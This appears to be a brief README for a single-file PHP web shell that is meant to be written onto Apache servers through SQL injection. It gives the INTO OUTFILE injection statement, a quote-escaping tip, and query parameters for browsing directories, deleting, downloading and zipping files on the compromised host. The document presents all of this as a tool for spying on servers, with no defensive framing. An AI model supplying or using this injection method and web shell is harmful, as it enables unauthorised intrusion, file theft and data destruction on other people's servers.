# SHEL | one line | single File
SHELL compatible with injection SQL using PHP to spy apache servers

LIKE : `SELECT "'.$phpString.'" INTO OUTFILE "public_html/shell.php"`

# USING

to read path   `?path=c://`

to delete file `?unlink=public_html/shell.php`

to read file   `?download=public_html/shell.php`

to zip folder `?path=public_html/&destination=name_zip_file`

# SQL injection

$phpString = ' replace all char ' with \\' ';
